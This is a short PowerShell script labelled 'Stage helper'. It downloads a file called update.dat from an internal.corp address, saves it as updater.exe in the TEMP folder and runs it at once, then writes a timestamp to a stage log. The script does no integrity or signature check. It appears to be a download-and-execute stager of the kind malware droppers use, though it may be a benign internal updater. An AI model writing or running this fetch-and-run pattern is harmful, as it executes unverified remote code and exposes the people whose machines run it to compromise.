# Stage helper
$DownloadUrl = 'http://internal.corp/assets/update.dat'
$LocalPath = "$env:TEMP\updater.exe"
(New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $LocalPath)
Start-Process -FilePath $LocalPath
Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
$StageMarker = "stage-33"
